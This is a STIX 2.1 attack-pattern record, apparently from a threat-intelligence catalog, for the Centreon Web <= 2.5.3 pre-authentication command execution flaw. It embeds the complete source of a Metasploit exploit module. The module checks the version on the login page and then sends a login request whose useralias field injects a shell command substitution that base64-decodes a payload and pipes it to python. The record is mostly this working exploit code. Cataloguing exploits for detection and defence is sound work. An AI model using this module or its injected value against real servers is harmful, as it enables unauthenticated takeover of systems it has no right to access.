{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--480afba4-c764-4571-80a3-321e3cfc5dd7",
    "created": "2024-08-14T17:01:45.051949Z",
    "modified": "2024-08-14T17:01:45.051953Z",
    "name": "Centreon Web Useralias Command Execution",
    "description": "( Centreon Web Interface <= 2.5.3 utilizes an ECHO for logging SQL errors.  This functionality can be abused for arbitrary code execution, and can be triggered via the login screen prior to authentication. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/centreon_useralias_exec.rb",
            "external_id": "centreon_useralias_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  include Msf::Exploit::Remote::HttpClient\n\n  Rank = ExcellentRanking\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'        => 'Centreon Web Useralias Command Execution',\n        'Description' => %q(\n          Centreon Web Interface <= 2.5.3 utilizes an ECHO for logging SQL\n          errors.  This functionality can be abused for arbitrary code\n          execution, and can be triggered via the login screen prior to\n          authentication.\n        ),\n        'Author'      =>\n          [\n            'h00die <mike@shorebreaksecurity.com>',         # module\n            'Nicolas CHATELAIN <n.chatelain@sysdream.com>'  # discovery\n          ],\n        'References'  =>\n          [\n            [ 'EDB', '39501' ]\n          ],\n        'License'        => MSF_LICENSE,\n        'Platform'       => ['python'],\n        'Privileged'     => false,\n        'Arch'           => ARCH_PYTHON,\n        'Targets'        =>\n          [\n            [ 'Automatic Target', {}]\n          ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2016-02-26'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [ true, 'The URI of the Centreon Application', '/centreon/'])\n      ], self.class\n    )\n  end\n\n  def check\n    begin\n      res = send_request_cgi(\n        'uri'       => normalize_uri(target_uri.path, 'index.php'),\n        'method'    => 'GET'\n      )\n      /LoginInvitVersion\"><br \\/>[\\s]+(?<version>[\\d]{1,2}\\.[\\d]{1,2}\\.[\\d]{1,2})[\\s]+<\\/td>/ =~ res.body\n\n      if version && Rex::Version.new(version) <= Rex::Version.new('2.5.3')\n        vprint_good(\"Version Detected: #{version}\")\n        Exploit::CheckCode::Appears\n      else\n        Exploit::CheckCode::Safe\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n    end\n  end\n\n  def exploit\n    begin\n      vprint_status('Sending malicious login')\n      send_request_cgi(\n        'uri'       => normalize_uri(target_uri.path, 'index.php'),\n        'method'    => 'POST',\n        'vars_post'  =>\n        {\n          'useralias'   => \"$(echo #{Rex::Text.encode_base64(payload.encoded)} |base64 -d | python)\\\\\",\n          'password'    => Rex::Text.rand_text_alpha(5)\n        }\n      )\n\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-02-26",
    "x_mitre_platforms": [
        "['python']"
    ]
}